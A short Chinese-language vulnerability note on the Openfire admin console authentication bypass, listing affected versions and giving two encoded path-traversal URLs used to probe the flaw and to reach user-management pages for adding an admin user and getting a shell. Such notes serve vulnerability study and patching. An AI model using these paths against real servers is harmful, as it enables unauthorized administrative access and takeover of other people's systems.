#### 影响范围

3.10.0 <= Openfire < 4.6.8 

4.7.0 <= Openfire < 4.7.5

#### 漏洞概述

Openfire是⼀个基于XMPP协议的实时协作服务器，它是⼀个开源的项⽬， 使⽤Apache许可证授权，它可以⽀持多种平台，提供强⼤的安全性和性能。XMPP是⼀种开放的即时通讯协议，也叫做Jabber。openfire可以⽤来搭建聊天室， 群组，视频会议等应⽤，Openfire还提供了多种插件和扩展，以增强其功能和兼容性，Openfire在3.10.0-4.6.7和4.7.0-4.7.4版本中存在身份认证绕过漏洞， 这允许未经身份验证的⽤户在已配置的Openfire环境中使⽤未经身份验证的Openfire安装环境，以访问Openfire管理控制台中为管理⽤户保留的受限⻚⾯

#### 漏洞复现

可以通过以下连接进⾏探测漏洞

```
/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp
```

随后通过一下连接获取session与csrftoken添加⽤户后台Getshell

```
/setup/setup-s/%u002e%u002e/%u002e%u002e/user-groups.jsp
```





